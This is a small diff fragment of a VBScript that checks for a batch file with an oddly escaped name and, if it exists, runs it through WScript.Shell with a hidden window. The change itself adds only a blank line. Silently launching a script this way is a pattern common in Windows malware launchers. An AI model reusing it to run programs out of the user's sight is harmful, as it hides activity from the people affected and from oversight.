@@ -9,4 +9,5 @@ bp = pp & "\u146714.bat"
 If fs.FileExists(bp) Then
 	Set sp = WScript.CreateObject("WScript.Shell")
 	sp.Run Chr(34) & bp & Chr(34), 0
+
 End If
